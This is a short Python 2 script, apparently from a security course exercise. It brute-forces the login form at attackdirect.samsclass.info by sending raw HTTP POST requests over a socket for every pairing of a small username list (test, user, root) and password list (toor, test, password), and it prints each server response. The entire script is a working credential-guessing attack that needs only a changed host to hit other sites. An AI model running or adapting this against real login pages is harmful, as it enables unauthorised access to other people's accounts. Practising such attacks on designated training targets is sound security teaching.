# Python 2.7.10
# - Does not work in Python 3. Yet.


import socket

# HTTP POST Request grabbed from POST to login form at http://attackdirect.samsclass.info/python/login1.php
 
req1 = """POST /python/login1.php HTTP/1.1
Host: attackdirect.samsclass.info
Connection: keep-alive
Content-Length: """

req2 = """Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=dd3e196bcc6504c012331fbb0c8b4ee3e1549572766

"""

# Username and Password list 

username = ["test","user","root"]
password = ["toor", "test", "password"]

# Iterate through list and send request 

for usr in username:

  for psw in password:

    length = len(usr) + len(psw) + 5

    s = socket.socket()
    s.connect(("attackdirect.samsclass.info", 80))
    s.send(req1 + str(length) + '\n' + req2 + "u=" + usr + "&p=" + psw + '\n')
    print s.recv(1024)
    s.close()
